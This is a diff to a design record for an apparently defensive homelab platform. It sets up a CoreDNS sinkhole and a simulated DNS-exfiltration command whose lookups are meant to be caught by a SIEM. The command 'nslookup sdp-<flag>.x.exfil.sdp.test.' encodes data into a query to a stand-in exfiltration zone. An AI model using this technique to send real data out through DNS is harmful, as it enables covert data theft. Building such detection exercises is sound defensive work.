@@ -536,17 +536,21 @@ the sinkhole, the command and their tests. The command works with or without the
 canary land with the rules (P3), the incident with the section (P4).
 
 **Decision, as built.**
-- **Sinkhole** - ConfigMap `coredns-custom`, key `exfil-sinkhole.server`, delivered by the k3s role
-  with CoreDNS (ADR 0026 amendment of 2026-10-04): `exfil.sdp.test:53` with `errors`, `prometheus` and
-  `template ANY ANY exfil.sdp.test { rcode NXDOMAIN }` - no `forward`, no `log`. `make validate`
-  refuses any other content.
+- **Sinkhole** - a server block in CoreDNS's own Corefile, delivered by the k3s role (ADR 0026
+  amendment of 2026-10-04): `exfil.sdp.test:53` with `errors`, `prometheus` and two `template`s - the
+  canary `ok.exfil.sdp.test` A 192.0.2.53, NXDOMAIN for every other name - no `forward`, no `log`. Not an
+  imported `coredns-custom` file: a missing file would let the zone fall through to `forward`.
+  `make validate` checks the effective configuration (no other block or imported file serves the zone,
+  mounts, args) and proves each check against its mutation.
 - **Command** - catalogue id `dns-exfil` after `beacon`, objective "Phone home", T1048.003, `allowed`,
   layer network, input `nslookup sdp-<flag>.x.exfil.sdp.test.`, alias `exfil`; the argv and its exit
-  semantics are ADR 0032's amendment of 2026-10-04 (exit 0 only on NXDOMAIN, D3 and F10, replacing
-  the `; true` above).
-- **Order of delivery** - CoreDNS first, then the proof from a sandbox pod (`SINKHOLE_ONLY=1
-  tests/scenarios/run.sh`), only then the catalogue: until kubelet has projected the new ConfigMap and
-  `reload` has read it, the zone is forwarded like any other name.
+  semantics are ADR 0032's amendment of 2026-10-04 (canary first, then the flagged name; exit 0 only on
+  NXDOMAIN, D3 and F10, replacing the `; true` above).
+- **Order of delivery** - CoreDNS first (branch `siem-dnsexfil`), then the proof from a sandbox pod
+  (`SINKHOLE_ONLY=1 tests/scenarios/run.sh`), only then the catalogue (branch
+  `siem-dnsexfil-catalogue`): until kubelet has updated the mounted Corefile and `reload` has read it,
+  the zone is forwarded like any other name. run.sh also runs the command only after its own sinkhole
+  check passed in the same run.
 
 **What the tests found.**
 - **The forward counter has another name.** `coredns_forward_requests_total` does not exist in
@@ -560,10 +564,13 @@ canary land with the rules (P3), the incident with the section (P4).
   CiliumNetworkPolicy lets DNS through the proxy only for `*.cluster.local`; a lookup in the zone from
   there is refused by Cilium before CoreDNS sees it and proves nothing about the sinkhole. The probe is
   a pod with the terminal's own spec in `sandbox` (`matchPattern: "*"`), the path the command takes.
-- **N9 closed:** with every query dropped, busybox `nslookup` waits 5.0-5.1 s and exits 1; run.sh's
-  `timeout 6` bounds it, the API's 5 s command bound usually ends it first.
-- **F7 holds as written:** under quarantine the query never reaches Cilium's DNS proxy, so there is no
-  query name to match and no NXDOMAIN; the command exits non-zero and "Phone home" is not achieved.
+- **N9 closed:** with every query dropped, busybox `nslookup` waits 5.0-5.1 s and exits 1, so the
+  command ends on its own after ~5 s (on the canary; the flagged name is never sent); run.sh's client is
+  bounded by `timeout 6`, and the API's 5 s command bound usually ends it first.
+- **F7 holds as written:** under quarantine no query reaches Cilium's DNS proxy, so there is no query
+  name to match and no NXDOMAIN; the command exits non-zero and "Phone home" is not achieved.
+- **What still sees the flag-bearing name:** Hubble records it at the DNS proxy and ships it to
+  siem01 - the record the SIEM correlates; it stays in the homelab and is never published (ADR 0021).
 - The command prints the resolver's address (`Server: 10.43.0.10`); the terminal output passes the
   API's scrub, which publishes it as `[ip]` (ADR 0021).
 
